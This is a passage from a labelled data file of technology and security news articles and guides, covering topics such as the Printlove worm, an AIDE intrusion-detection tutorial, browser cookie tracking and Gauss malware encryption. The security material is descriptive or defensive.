hardware, it looks like software developers are still in the \"free lunch\" phase with regards to energy consumption. That is, I can simply wait until the next processor generation is released, recompile my application, and get the benefit of equal or better execution performance while the power consumption of my application improves automatically.\nIn those halcyon days when I could spend a year at the beach instead of coding and still speed up my code execution by running my application on the faster, next-generation processor, it was still possible to make improvements to the application that would optimize execution and increase the execution speed on the currently available hardware. Now, for those of us that might be more proactive about energy efficiency (or don't have a beach close enough), I wonder if there is anything a programmer might be able to do that would directly affect the power consumption of a given piece of code. In more colloquial terms, I could pose the question: \"Which is more energy efficient: a\nfor loop or a\nI'm sure that I'm showing my ignorance of hardware and computer architecture when I say, \"Yes, a programmer can affect the energy consumption of an application, but not as directly as we might hope.\" Allow me to qualify that before you jump all over my naiveté.\nIn the arena of serial programming (more on the effects of parallel execution in a few paragraphs), there might not be much programmer influence on energy usage. I am assuming the execution of one instruction requires the same amount of energy as any other instruction. From what I remember about modern computer architecture and the execution of instructions, there is a pipeline to perform all the steps required and there are fixed number of stages in the pipeline. This suggests that it doesn't matter if the instruction is a floating-point or integer operation; the energy needed to traverse the pipeline is the same. I do recall that there are more overall steps involved in handling floating-point numbers versus integers, but that just might mean some stages in the pipeline are skipped. Is there any appreciable energy savings to be had when bypassing the exponent normalization? Even if my assumption on energy consumption between two different operations is wrong, there aren't many applications that I know of where you can replace floating-point calculations with an integer operation and still yield correct results.\nLooking in a positive direction, one thing that I am sure can be done by the programmer would be to reduce the total number of instructions. If you can accomplish in 100 instructions what can also be done in 200 instructions, the former execution will use less overall energy. There are certainly large changes in the number of instructions used by one algorithm over another; e.g., Quicksort over Bubblesort. Unrolling loops will perform the same number of computational steps, but reduces the number of testing and looping instructions that are executed. There might be some difference in the energy consumption between a\nfor loop and a\nwhile loop if the number of instructions involved in incrementing loop index variables and testing termination conditions are significant between the two variations. If there is such a difference and such a change is feasible, is that energy savings worthwhile for all the time and effort it would take to recode from one loop format to the other?\nVector operations are another place where a programmer can reduce the consumption of energy by an application. Does it cost any more energy to execute on a single operand (in a vector register) than it would require if you load up the vector register with four operands? I would think both situations are the same, but the latter gets four times the results and is able to compute the desired answers in one-fourth of the time with only one quarter the energy consumed. Compilers can detect many instances where vector computations could be used even if the programmer didn't explicitly code for vector operations. If the compiler can't make that call due to conservative assumptions, intervention by the programmer via compiler directives or pragmas will inform the compiler that such vectorizations are safe. Adding these compiler hints will be much less time-consuming than changing loop structures. In cases where vectorization might not be viable, but there are still independent computations that can be executed concurrently, there is still a possibility for energy conservation on multicore processors.\nToday's processors, as I mentioned earlier, are more energy aware. When the processor is not actively executing, it will be set into a lower powered state as it sits idle. When some execution is ready to proceed, the frequency and power are amped up and the computation is executed. For sake of example, let me assume I have a quad-core processor that runs at 5Wh (Watts per hour) per core when the core is running at full speed and 1Wh per core when idle. Running a serial computation that takes 4 hours will burn 32 Watts (20, 1 core x 5Wh x 4 hours, for the active core and 12, 3 cores x 1Wh x 4 hours, for the three idle cores). If I can parallelize that same computation across all four cores, the execution time will be only one hour and the total energy used will be only 20 Watts (4 cores x 5Wh x 1 hour). Not only is the answer computed quicker, but the parallel execution has a tangible energy savings.\nI was once told that a prominent GPU producer had measured the amount of energy that every operation (computation, access to memory, moving data in from off-card, etc.) took on its products. If an addition or multiplication or a register shift take different amounts of energy, how willing would you be to find just the right mix of equivalent instructions to carry out some desired computation? Then, how much documentation do you need to provide to the programmer that needs to maintain your code so that the version you implemented — instead of the standard algorithm — is much better for everyone? There are easier ways to conserve power (outlined above) and do your little part to save the polar ice caps and the planet, which will help keep the oceanfront beaches where they are instead of outside your third-story window.", "label": 1}
{"text": "A common recommendation in our profession is to learn a new language each year. This advice can truly be sold only to people starting out in software development, rather than practiced hands. Unless you're a language junkie, this is advice that cannot be followed because languages take more than a year to learn well (that is, far beyond simple exposure and noodling with small projects).\n- IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies\n- Application Testing Strategies in the IBM z/OS Environment\n- Strategy: How to Conduct an Effective IT Security Risk Assessment\n- Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5\n- The Untapped Potential of Mobile Apps for Commercial Customers\n- Why is Information Governance So Important for Modern Analytics?\nA language doesn't really begin to expose its strengths and weaknesses until you write programs of several thousand lines. That's the point where you recognize that a feature that looked appealing is now an encumbrance and another feature that seemed pointless is truly valuable. This insight is equally true of the principal tools in the language's ecosystem, most especially the debugger and the build tools. The former is particularly important, because errors are expressed in radically disjoint ways in different languages.\nThere is another stage beyond this level, which is writing idiomatically in the language, rather than taking our native coding style into the new world. This last step is particularly difficult. I'm speaking here conceptually, rather than syntactically. Each language uniquely expresses fundamental concepts that it favors. For example, Go, which we've discussed extensively during the last 12 months, does not use object orientation in the usual way, rather it favors composability. Composability requires a whole different approach to building programs from objects. It forces newbies to rethink how OO works and how to represent programs as objects. If you stop short of learning composability in Go, and simply learn the syntactic equivalents of operations you already know, then you've lost most of the benefit of the \"learn a new language\" dictum. This is where the real value accrues. Build some multi-KLOC programs using composability and there is no doubt you will write different code when you return to C++ or Java.\nThis underscores a key point: To maximize the value of learning a new language, it's important to choose one that is significantly different from the ones you know: for example, learning a functional language if your natural home is OO; learning OO if your natural home is imperative; and so on.\nAfter choosing a language that sparks your interest, it's important to avoid the path of least resistance, which goes something like this: Buying a tutorial. Going through the first 150 pages and learning the syntax plus a few handy concepts. Putting the book down and starting to work on a small sample project. And then looking up items on an ad hoc basis when you need them later. The slip is in not finishing the tutorial. As a result, you pick up only the simple things that you need immediately and lose all the advanced topics.\nHave you really learned Java if you've not explored reflection, serialization, or, say, class loaders? I submit you probably haven't. And unfortunately for many of us (me included), we learn the subset that is predominantly needed by daily work. Why learn reflection if I don't need reflection in my work? The answer is clear: If you don't know reflection, you will never spot the opportunities where it will best solve a problem. (I don't want to stray too far off topic, but this is the benefit of reading other people's code. Good developers use the entire palette of features of a language, so reading their code illuminates instances where an elegant solution is possible via a little advanced feature you might not have known about.)\nThe bottom line is that learning a new language is both a long effort and a deeply rewarding one. I don't believe that a language can be mastered at the rate of one a year, so I view the recommendation to do this as pie-in-the-sky silliness, rather than a worthy goal. A much better path, in my view, is to learn several rather different languages well. And then cultivate and maintain the central ones you need by making sure you stay up with advances in the language and reading the code of other, better developers.", "label": 1}
{"text": "Embedded devices a cinch to pwn\nThe weak link in the chain\nCanSecWest Cell phones, modems, routers and similar devices are a lot easier to hack than most people think, making them an opportune target for criminals looking for an easy way to pierce a network, a researcher from Juniper networks says.\nSpeaking at the CanSecWest security conference in Vancouver, Barnaby Jack demonstrated how a soldering kit and some basic knowledge about the processors typically used in embedded devices can allow miscreants to download the firmware running on the hardware. The code can then be modified to make the devices do all kinds of nefarious things, he warns.\nOver the past decade, computers - usually those running Windows - have emerged as the vector of choice for cyber crooks. That is beginning to change for several reasons. For one, years of trial and error (with an emphasis on error) has helped Microsoft harden the defenses of its software, making it harder to find critical vulnerabilities. At the same time, the number of cell phones, routers and other embedded devices has proliferated.\nHardware designers often make it easy for their devices to be hacked because they contain debugging functionality and hardware interfaces not needed by end users.\nJack demonstrated how modified firmware for a router made by D-Link changed default settings so remote administration was enabled. (He emphasized gear made by other vendors was equally at risk.) That in turn would allow the router to be accessed remotely, potentially allowing the altering of DNS settings or the disclosure of VPN credentials.\nWe would have been more impressed had it been possible to modify the firmware remotely. Alas, that was not the case. To alter the settings, the criminal would need to access the device on the local area network. Jack claims similar attacks could be carried out over the net.\nWe'll give Jack the benefit of the doubt here, not just because we're in a charitable mood, but also because he makes a good point. Embedded devices are everywhere and we suspect little thought or money is put into fortifying them against the increasing sophistication of today's cyber attacks. Consider yourselves warned. ®", "label": 1}
{"text": "DARPA looking for citizen sky-watchers\nWhy not find some space junk in your spare time?\nA reader has alerted The Register to a story that passed us by last week: the launch of a DARPA program recruiting amateur astronomers to help identify and catalogue space junk.\nLaunched here, the SpaceView project would add “citizen scientist” efforts to more expensive space junk searches like the Space Surveillance Network.\nThe number of known objects in the cloud of detritus surrounding the Earth is more than half a million and growing – every new launch adds to the problem, and collisions between objects are getting more common as they multiply.\nBy comparison, the Space Surveillance Network is only tracking around 30,000 bits of junk. Hence SpaceView: an attempt to expand the available resources without crippling cost.\nThe project is currently at the sign-on stage: DARPA wants to know about the “equipment, sites and observing habits” of astronomers interested in joining the program.\nThe program is looking for sites with equipment that could be upgraded to collect observations under remote control, which would act as a single distributed world-wide sensor. Where a site is selected for inclusion in SpaceView, DARPA will provide the equipment to turn it into an automated observatory.\nThe first dozen sites will be selected late in 2013. ®", "label": 1}
{"text": "Physically Secure Your Computer\nUnfortunately, computer thefts do occasionally happen at Whitman. Almost always it is a crime of opportunity — a laptop left alone and unsecured in the library, for example. It is your responsibility to ensure that your computer is secured against physical theft. The following advice can help you to that end.\nProtect the Computer Itself\nThe best way to protect yourself from computer theft is to make it as difficult as possible for someone to pick up your machine and run off with it.\n- If you have a desktop computer, you may wish to investigate padlocking the case shut to prevent theft of internal components.\n- If you have a laptop computer, you may wish to acquire a laptop locking cable: the computer equivalent of a bicycle lock.\n- At the very least, do not leave your laptop unprotected or unattended, in any open area, even for a few minutes, and always make sure you close and lock your room door when you leave.\nProtect Access to Your Computer's Data\nIf the worst should happen, and your computer does get stolen, the thief could gain access to all of your computer's secrets. It may not seem a big deal for a Bad Guy to see your homework assignments or music collection, but your computer could also contain some very valuable and important information about you. Passwords, financial data... even something as mundane as your Facebook credentials can have value to an attacker, and can easily be recovered from a stolen computer unless you take steps to protect your data.\n- Set a hard drive password.\n- If you laptop has a fingerprint scanner, consider using it to lock access to your computer's operating system.\n- Encrypt your home folder. OS X and (some versions of) Windows have built-in tools for doing this. More information may be found on our Encryption page.\n- Even better, encrypt your entire hard drive. For information on how to do this, see our Encryption page.", "label": 1}
{"text": "A computer worm that propagates by exploiting a 2010 Windows vulnerability is responsible for some of the recent incidents involving network printers suddenly printing useless data, according to security researchers from Symantec.\nMany companies have reported unauthorised printing incidents in recent weeks, prompting antivirus firms to investigate the possible causes.\nOn June 21, Symantec reported that the rogue printouts were the result of computers being infected with a Trojan program called Trojan.Milicenso.\nHowever, the company's researchers have since determined that the propagation routine of a separate piece of malware, a worm called W32.Printlove, can cause similar problems, Symantec researcher Jeet Morparia said earlier this week.\nW32.Printlove infects other computers on the local network by exploiting a remote code execution vulnerability in the Microsoft Windows Print Spooler service that was patched in September 2010. Identified as CVE-2010-2729, this vulnerability was also exploited by the Stuxnet industrial sabotage worm to spread.\nThe rogue printing behaviour can occur when W32.Printlove unsuccessfully attempts to infect a Windows XP computer connected to a shared network printer.\nThe worm starts by sending a print request to a targeted computer that is specifically crafted to exploit the CVE-2010-2729 vulnerability. If the exploitation attempt is successful, a copy of the malware is dropped in the Windows system directory and then executed.\nHowever, if the system is patched against CVE-2010-2729, a copy of the worm is created in the computer's printer spool directory - %SystemRoot%\\system32\\spool\\printers - as a randomly named .spl (Windows Printer Spool) file.\nThe computer interprets the creation of this file as a new print job and instructs the network printer to print the file's contents, therefore wasting paper and toner.\nBecause the worm periodically retries to infect a system, the rogue printing behaviour will be repeated until all network computers are cleaned, Morparia said. \"Tracking down the source of these junk print jobs can be more complicated when there are multiple infections on the network.\"\nFortunately, the failed infection attempts leave behind .shd files in the printer spool directory that contain details about printing jobs, including the names of computers that initiated them. Administrators can inspect SHD files with a free tool called SPLViewer after shutting down the Print Spooler service, Morparia said.\nThe W32.Printlove worm might be linked to the previously reported Trojan.Milicenso, Morparia said. \"We intend to continue our investigation to confirm any relationship between the two threats.\"", "label": 1}
{"text": "Over the past decade, the United States has witnessed remarkable advances in personal communications technology. Most of us now take for granted the ability to share all forms of information quickly, efficiently and cheaply. Our men and women in uniform have that same expectation.\nHowever, the modern warfare environment is complex and much different from what it was even 10 years ago. Additionally, preparing for current and future wartime environments is especially challenging in our fiscal climate.\nFiscal responsibility will mean extending the useful lives of proven systems, leveraging investments in commercial technologies, making current systems more effective through affordable upgrades and exploiting new operational concepts made possible by small technical enhancements.\nIn the case of the U.S. Army, it places more emphasis and responsibility on the squad. These squads need a substantial amount of flexibility and autonomy while staying connected to each other during the fight. U.S. forces need to collaborate and coordinate with unprecedented speed and accuracy. These well-trained fighting forces will need to make decisions on their own, and must have necessary information readily available. Networking is the uniquely powerful advantage for operations today and into the future.\nFor example, networking sensor systems — including radars among ships, aircraft and tethered aerostats — creates a more complete picture of the theater. Information from netted radars can be combined to see enemy missiles and aircraft earlier, and to detect threats that might be able to evade individual radars. When our aircraft battle adversaries are equipped with capable air defenses, networked jamming can be used to more effectively blind the enemy’s own radars.\nA commander in the field can rely on netted sensors to receive alerts detailing enemy fires and maneuvers. Even on the move, a commander can use mobile mission command systems to request intelligence, plan a counterstrike, direct networked weapon systems to execute it and call on surveillance systems to deliver the information needed to assess the results.\nThe technology empowers a single person or small unit to direct an action involving calls for intelligence, fires and surveillance. Shared, secure networks enable a convergence of intelligence and operations.\nHere’s another example of convergence: Vehicle-mounted night vision systems were developed originally to allow a gunner to see and engage targets at night and in degraded weather conditions. That mission expanded to the driver and commander. Once on the net, those cameras on the Army’s combat vehicles become sensor nodes. They become surveillance assets for the larger force, able to capture and deliver ground-level imagery to another unit that needs a different look at an area.\nWith networks that scale from the tactical edge to headquarters, that same video footage can be shared and become part of the theater intelligence database, where it can help analysts fill gaps in regional imagery. A similar story could be told about images or audio captured by an infantry soldier.\nThe dismounted soldier should be a major focus of investment in new networking technologies.\nRich intrasquad communications enhance the autonomy and effectiveness of small units by going way beyond voice communication. “Here’s what I think” becomes “here’s what I am seeing.”\nA mission plan or tactical situation can be marked up white-board style by forces collaborating in silence. This results in a leap ahead in situational awareness at all echelons.\nSoldiers’ communication tools need to have effective filters to identify which information matters. During a firefight, a data glut is just as bad as a data dearth. There isn’t time to sift through all the information.\nData that matters needs to be quickly and automatically flagged, integrated and shared. Small, high-definition cameras can now be easily and unobtrusively attached to weapons and armor. So intrasquad communication tools need to be able to carry full motion video. And data needs to be available immediately and without decay in its quality; even a few seconds of lag can mean the difference between a successful mission and one in which the enemy escapes or American lives are lost.\nDuring the push to upgrade military networking technologies, it’s still important to maintain fiscal responsibility. So the military and industry should collaborate and take advantage of existing systems that can be affordably upgraded, and make targeted investments in new tools that are compatible with these systems.\nImproving networking capabilities doesn’t require the military to break the bank, and equipping our forces with the networking tools they need will save lives and help them defeat our enemies.\nAndrew Zogg, vice president, Network Centric Systems, Business Development, Raytheon.", "label": 1}
{"text": "Front-line measures like firewalling, strong authentication, and staying on top of security updates are mandatory steps to keeping your system secure. But you also need to check your system's health frequently and make sure a compromise didn't slip past you unnoticed. A good place to start is with an intrusion detection system (IDS) that monitors your machine's resources and flags any changes that might indicate an intruder or a rootkit. The Advanced Intrusion Detection Environment (AIDE) is an open source IDS that you can set up in a weekend.\nBefore we get started, though, it's vital to understand how an IDS like AIDE functions. AIDE is a host-based IDS, which basically means that it scans the filesystem and logs the attributes of important files, directories, and devices. Each time it runs, it compares its findings against the previous, \"known good\" data, and alerts you if something has changes. But the downside is that if your system is already compromised before you install and run AIDE initially, you won't be able to detect it.\nOf course, the odds that your system is already compromised aren't high, but the fact remains that the only way to guarantee that it is clean is to install and run AIDE right after you install the OS, but before you connect to the network. Put that on your to-do list when deploying new machines from now on, and as for your existing Linux boxes, make do as best as you can.\nAIDE runs on Linux and most other Unix-like operating systems. It is provided by most of the distributions, but you may want to consider grabbing the code from the project's Web site and compiling from source — there are a few advanced options that are only available at compile-time via the ./configure script. If you've already installed an AIDE binary, run\naide -v, which will dump out the version number and the compile-time options used. For now, though, we'll talk about the basic installation and usage.\nSetup and First-Run\nAIDE works its magic by reading in a configuration file that contains both a list of directories and files to scan, and the attributes of each entry to log. It then works its way through the tree of nodes to be scanned, and writes out a database of the attributes found. There are currently thirteen attributes that AIDE can log — including permissions, owner, group, size, all three timestamps (atime, ctime, and mtime), plus lower-level stuff like inode, block count, number of links, and so on.\nOn top of those, AIDE supports multiple has algorithms with which it can generate checksums for each file. By default, the list includes MD5, SHA-1, SHA-256, SHA-512, RMD-160, Tiger, HAVAL, and CRC-32. If you compile AIDE with the mhash option to the configuration script, you can also use GOST and Whirlpool hashes.\nBinary packages probably include a decent example configuration file in\n/etc/aide/aide.conf — in a bit, we'll explain why you might want to use a different location, but for the moment, open the file in an editor, and take a look at the configuration directives.\nNear the top are rule definitions, which are just user-supplied names followed by an equal sign and a list of attributes and hashes. For example:\nSizeOnly = s+b SizeAndChecksum = s+b+md5+sha1 ReallyParanoid = p+i+n+u+g+s+b+m+a+c+md5+sha1+rmd160+tiger+whirlpool\nThe first line activates just the size (s) and block count (b) attributes. The second adds MD5 and SHA-1 hashes, and the third logs just about every supported feature, including inode (i), timestamps (m, a, and c) and a fistful of additional hashes.\nBelow these rule definitions you'll find a lines listing the directories and files to check, using regular-expression based formulas. For example:\n/etc SizeAndChecksum /sbin ReallyParanoid /var Size !/var/log/.* !/var/spool/.*\nThe first three lines are \"positive\" expressions, which tell AIDE to include everything that matches the regular expression. The leading exclamation point on the last two indicate a \"negative\" expression, which in this case says to exclude the rapidly-changing\n/var/spool/ directories. As you can see, each positive expression is followed by the name of one of the rule definitions. You could also use a literal string instead of a rule name here, such as\n/var/www/intranet p+s+b+a+sha256 — the rule names are just for easier reading.\nCorrectly defining your regular expressions and rules is the trickiest part of using AIDE. Too many files and directories, and you can end up with extremely long logs to read through on every integrity check. Too narrow of a set, and you risk missing an intruder. It's also not trivially easy to get the right balance of regular expression syntax when you want to match some files in a directory hierarchy, but not others. It's a good idea to consult the AIDE user manual and read\nman aide.conf for help combining wildcards with positive and negative expressions.\nOf course, there's no substitute for actually trying out your configuration with a real run. Run\nsudo aide --init, and AIDE scans the designated files and directories, writing its findings to a database. The location of the database is determined by a line of the form\ndatabase=URL in the configuration file. The data is also copied to stdout, so you can watch the process from a terminal window. If you're missing some files and need to tweak your expressions, you can do so and re-run the process before proceeding.\nComparing Subsequent Checks\nNow comes the important (and potentially confusing) part. Time goes by, and whenever you feel it's prudent, you decide to run another scan with\nsudo aide --check. Except that unless you specify otherwise, AIDE looks for a configuration file in the current working directory — which raises the question of where you should keep that all-important configuration file.\nAt first glance, it might seem like you should store it in a standard location like\n/etc/aide/, but that's actually a bad idea, because if your system ever was cracked, intruders could not only read your AIDE configuration and look for directories that you've elected to ignore, but they could alter the URL of the output database in order to trick subsequent AIDE scans.\nSo the best plan is, in fact, to store the aide.conf file on removable media (preferably read-only), that you mount just before running a scan. For similar reasons, the safest place to store AIDE's output database is also on this removable media, so inside the configuration file the database line might be\ndatabase=/media/AIDE_CD_012345/aide.db. You tell AIDE where the configuration file is with the --config command-line parameter.\nThus, the correct scan command to run is (in this example)\nsudo aide --check --config=/media/AIDE_CD_012345/aide.conf.\nIf someone replaces your copy of /sbin/fsck, the second scan should notice it and report it to you on stdout. On the other hand, you may have good reason to alter a system file like /etc/pam.conf yourself, in which case you don't need AIDE throwing a red flag every time you run a scan. You can invoke AIDE as\nsudo aide --update --config=/path/to/your/aide.conf to both run a scan and output an updated copy of the database. AIDE will save the new database at the URL you specify in the configuration file after\ndatabase_out=. If you're following proper protocol, this will be someplace mounted read-write, and you will subsequently copy the new database to your read-only media.\nSo how often should you run scans? It depends on the machine. On the plug-computer that runs your house's lighting control and sprinkler system, rarely. On the company's Internet gateway, daily at least.\nExtra Credit: ACLs, SELinux, and Database Signing\nAs you've probably realized, all AIDE can do is alert you to changed files. The ball is in your court to recognize whether the change is a sign of a security breach. Some system files should never change; some (such as tty devices) change owner and permissions during regular operation. You have to get to know your system.\nDepending on your system, you may not find the generic AIDE binaries supplied by your distribution up to the task. That is because there are a few attributes that AIDE can monitor only if they are configured as compile-time options, such as support for SELinux's security contexts, access control lists, and extended file attributes. If you need any of those features, you'll want to compile AIDE yourself from source. Luckily it's not hard; the standard GNU compiler chain is all that is required.\nAs mentioned above, the compile-time options also include support for additional hash algorithms. Which you prefer is largely a matter of personal mathematical preference. But there is also one other compile-time option that you should consider if you want a really secure setup. Configuring AIDE with HMAC (hash-based message authentication code) support allows you to cryptographically sign both the configuration file and the output database.\nThis is a compile-time option, not a run-time option, because adding it in prevents the\naide binary from running a scan in the event that the signature of the config file or database doesn't match. That's what you want: a binary that cannot be tricked into using a compromised database. Because let's face it — the read-only media you're using is only as secure as the locker you store it in. To configure AIDE with HMAC support, read the final section of the AIDE online manual. You'll need to pick a pair of encryption keys, but otherwise it's a fairly simple process. After that, it's sit back and scan-as-usual.", "label": 1}
{"text": "Many a time users forget that browsers are in fact just programs like a game or a photo editor, with the ability to connect us any local network or the World Wide Web. Simply because we may be visiting a secure site, or are browsing a secure location does not mean that we are automatically safe from the many threats there are online, as our browsers as well can fall prey to hackers and the like. In fact it is this misunderstanding which has led internet browsers to become one of the most popular routes through which users can be targeted.\nCookies are another interesting thing that you should be aware of. The cookies which are stored on your hard drive are in fact little packets of data that were sent from a specific website and contain information related to that website, the purpose is, that the next time your decide to visit the same web page the information from that page is already present on your computer and hence loading up the site is done much more rapidly. Cookies themselves are designed to hold information related to that website, however, people out there looking to do you harm can manipulate the cookie to store more than just information of that site itself. For example cookies that can track your online behavior and patterns. Another way that cookies can be rather dangerous is through an approach called packet sniffing, as the cookies are packets of data, hackers and others trying to steal information don’t have to hack your computer, rather they can intercept and sniff the information sent out from your computer in the little packets we call cookies, with software such as Firesheep. By making sure that you are running and storing safe cookies you can help protect yourself from packet sniffing and other such problems.\nAnother thing that can compromise your security is running an out of date browser version. The reason why browsers have newer versions is simply because there are always errors and bugs that the developers are always trying to uproot and correct, the newer version of your browser contains many security updates which will protect you from newer viruses, viruses which your old version can be infected with. Another good addition to an updated browser version is using an anti-virus which also scans your browser and protects you from online threats. This combination should provide you with a very good safety measure; however anti-spyware software to run with your browser is also not a bad addition. And all three working for you simultaneously should have you covered from most places that you may visit online.\nThe other routes through which your computer can be compromised are the plug-ins that run on your browser for example the flash player which is used to play videos. These are things that are built in to your browser and the best solution is to use only those which are necessary.\nImage Courtesy: wktconnection", "label": 1}
{"text": "Who's Tracking When You're Browsing?\nOnline privacy was in the headlines recently when news broke that Google bypassed privacy settings in Apple's Safari browser and Microsoft's Internet Explorer browser to install cookies to track activity. The stories stirred up concerns among users about what information is being collected about them.\nLet's first review what a cookie is and what it does. Cookies are small files that websites can place on a hard drive to do things like identify returning visitors, personalize content displayed, and store items in shopping carts. They are also used for data collection to determine usage statistics.\nJumping Through a Loophole in Safari\nResearchers discovered that Google bypassed the privacy settings in Safari by exploiting a loophole. It involved tricking the Safari browser into allowing it to install cookies to serve ads with a tie-in to its Google Plus social network — adding a +1 button to ads for users to click if they approved of them. Because of another quirk in Safari, this opened the door for additional Google cookies to be installed, potentially allowing wider tracking.\nGoogle's response was that it used known Safari functionality to provide features for people who were signed into Google services. Enabling the installation of additional cookies was unintentional, it said, so the company started removing these cookies from Safari browsers. Google also noted that the cookies do not collect personal information.\nExploring What Happened With Internet Explorer\nShortly after the Safari loophole was announced, Microsoft discovered that the privacy preferences of Internet Explorer's users were also being circumvented by Google. Microsoft said Google was getting around a privacy safeguard in its Internet Explorer 9 browser that helps users prevent advertisers from placing cookies on their computers.\nHere's how it happened: IE9 blocks sites from installing cookies for other sites so Google.com shouldn't be able to install a cookie for its advertising arm, DoubleClick.com. The exception is that IE9 does allow sites to install third-party cookies if they flash a kind of \"digital ID card\" called P3P (Platform for Privacy Preferences). P3P relies on sites like Google to volunteer a description of themselves, including what will be done with data gleaned from tracking users. Any site that refuses to describe itself to Microsoft's browser gets a tracking cookie anyway. In other words, the system only blocks sites that explicitly identify themselves as advertisers. Those that don't identify themselves at all can slip through.\nTake Action to Guard Your Privacy\nWhat steps can you take if you're concerned about browser tracking? Web browsers have settings that allow you to manage at least some tracking activity by setting your cookie preferences, and you can also choose to delete certain cookies. Simply follow the tutorials included here.", "label": 1}
{"text": "Cloud Computing: CNBC Explains\nSenior Editor, CNBC\nTo hear the experts tell it, cloud computing may be the most innovative technology development in decades, or should be dismissed as a marketing tool for existing know-how that's as old as computers themselves.\nWe can't settle the debate on the uniquene\nss of cloud computing, but there are some issues that can be resolved without controversy: just what is cloud computing, who uses it, and what are the benefits and risks?\nWhat is Cloud Computing?\nThe official definition from the National Institute of Standards and Technology reads: \"Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g., networks, servers, storage, applications and services)that can be rapidly provisioned and released with minimal management effort or service provider interaction.\"\nTranslation? Accessing the Internet anywhere, anytime and being able to use any or all of the data and applications that you want.\n\"Consumers don't completely understand it yet and there's been a lot of hype, but it's having your data or software stored somewhere besides your PC or Mac and being able to get it through the Internet,\" explains Chris Geiser, CTO of The Garrigan Lyman Group, a digital marketing and advertising agency.\nWhen the technical jargon is stripped away, cloud computing can be grasped on its basic level— anytime, anywhere computing—without the user ever having to know much about the technology.\nHow Does It Work?\nIn simplest terms, cloud computing involves delivering hosted services over the Internet. The service end is where the data or software is stored and the user end is a single person or company network.\n\"Cloud computing minimizes the hardware, like memory, and application requirements, like word processing, for the users and pools those resources in the 'cloud,\" says Danny McPerson, CSO of Verisign .\nSo, a company in the business of hosting has specified data stored on its servers, a user fires up their computer, connects to the web (and to the servers holding their data), clicks on their application software and away they go.\nWhat gets somewhat mind-numbing are the kinds of storage systems services used in cloud computing. There are three basic 'alphabet soup' levels of storage capabilities, but there's no real need to go into those here. Any or all three can be offered by the same provider—for a price.\nAnd there are so-called public, private or hybrid clouds; public meaning the data is accessible to anyone, private being subject to a company's firewall or security system, and hybrid, which combines both public and private.\nBut it's fairly safe to say that most users are more than likely to be content knowing their data is stored somewhere other than their computer and they have access to it whenever and whereever they go online.\nWho Uses Cloud Computing?\nYou are probably using it right now. If you use email, or go to a social network and post photos, access online document software, or use your company's hardware/software, you're probably using the cloud. You may also use it to store online tax or financial records. You can also use cloud computing to back up files for storage off your PC or Mac.\nBusinesses such as hotels use it for consumers to make reservations and a major electronics retailer is using it to fill their online orders. Sending a picture to a Facebook friend today? You are headed for the clouds.\nWhere Did Term Cloud Computing Come From?\nThe concept of cloud computing dates back to the 1960's. The phrase originates from the cloud symbol used by flow charts and diagrams to symbolize the Internet. The diagram to the left underscores the idea that any computer connected to the web has access to a pool of computing power, applications and files.\nThe first reported public use of the term came in August of 2006 at a search engine conference in San Jose, Calif. when then Google CEO Eric Schmidt described one approach to data storage as \"cloud computing.\"\nBut in a sign of the ever-competitive Internet wars, research shows that Schmidt may have been trying to pre-empt Amazon,which was about to release its Elastic Compute Cloud system later that month.\nWho Provides Cloud Computing Services?\nDozens of firms are providing 'clouds' in the U.S. and other countries. They generally fall into three categories of service: software, storage and computing power, or platform providers that give site developers tools to build and host applications. Some do all three. Big or small, all see this as a natural way to make money in a very competitive field.\nSome names might be surprising as they may be better known as content providers or consumer sites. Here are just a few of the major players:\nAmazon: considered one of the innovators in cloud computing since it began offering services in 2006. Amazon has thousands of small business and individual users along with customers like the New York Times and Eli Lilly .\nGoogle: in what might have been a strike again Microsoft , the internet search giant launched Google Apps in 2007. Customers include small businesses and colleges like Northwestern University.\nMicrosoft: the tech giant has made its windows operating system available with cloud computing through the Azure program. Microsoft also offers various business services. Customers using the program include Epicor and Micro Focus.\nNetSuite: founded by Oracle CEO Larry Ellison, NetSuite offers web based applications for small businesses including Wolfgang Puck Coffee.\nSalesforce.com: started in 1999, Salesforce is considered a pioneer in cloud computing, with its software as a service product. Customers include financial services, media and health firms as well as retail companies.\nGoGrid: the Canadian based firm is a division of ServePath. It's said to be one of Amazon's chief competitors in cloud storage. Customers are mostly start-up firms and a few bigger companies like Novell.", "label": 1}
{"text": "Gauss malware, Apple iPhone show what encryption can do\nSome of the most sound advice for securing sensitive information, whether it be in an e-mail, on a mobile device or at rest in a database, involves encryption. Simply put, encryption can keep data safe, for good or ill, as a couple recent examples illustrate.\nAfter researchers at Kaspersky Labs come across Gauss, the latest in the Stuxnet/Duqu/Flame state-sponsored malware chain, and started examining it, they ran into a problem. The malware contained an encrypted “warhead” that the researchers couldn’t crack.\nGauss has a module called “Godel” (many of the malware’s components are named after famous mathematicians) with a payload of unknown purpose. “Despite our best efforts, we were unable to break the encryption,” researchers said in a blog post.\nStuxnet/Flame/Gauss and the limits of cyber espionage\nMobile security guide catches up with smart phones, BYOD\nSo Kaspersky offered up all of its information on Gauss and asked “anyone interested in cryptology and mathematics to join us in solving the mystery and extracting the hidden payload.” A long list of people have contributed ideas, but as of this writing the warhead remains a mystery.\nGauss was discovered infiltrating systems in the Middle East, primarily in Lebanon, and is believed to be part of a U.S.-led cyber warfare program that includes Stuxnet and Flame, both of which were found mostly attacking systems in Iran. U.S. officials likely are hoping Gauss’ encryption holds up.\nThe investigation into Gauss might illustrate how cyberspace differs from traditional battlegrounds. During, say, the Cold War, if scientists found an unfamiliar warhead they probably wouldn’t make a public project out of taking it apart and seeing what’s inside. But the Gauss investigation also shows the power of encryption -- be it in malware, in industrial systems in computers or even phones.\nAgencies should take note of how encryption protects data, particularly as they try to manage security for mobile devices that can be lost or stolen.\nLaw enforcement officials worry that good encryption could hurt their chances of retrieving forensic evidence against suspected criminals, but that same protection could also be applied to devices being carried by government employees.\nApple, for example, has improved the security on the iPhone to the point that it could leave law enforcement at a disadvantage against criminals who carry them, Simson L. Garfinkel writes in Technology Review.\nThe most significant of Apple’s security steps for the iPhone is the addition of the Advanced Encryption Standard, a U.S. government standard since 2001 and considered to be unbreakable, Garfinkel writes. And the iPhone’s tightly knitted architecture makes it easy for users to apply the encryption. And of course, encryption tools are available for Android and other mobile devices.\n\"I can tell you from the Department of Justice perspective, if that drive is encrypted, you're done,” Ovie Carroll, director of the cyber-crime lab at the Justice Department’s Computer Crime and Intellectual Property Section, said at a recent conference, Garfinkel reports. “When conducting criminal investigations, if you pull the power on a drive that is whole-disk 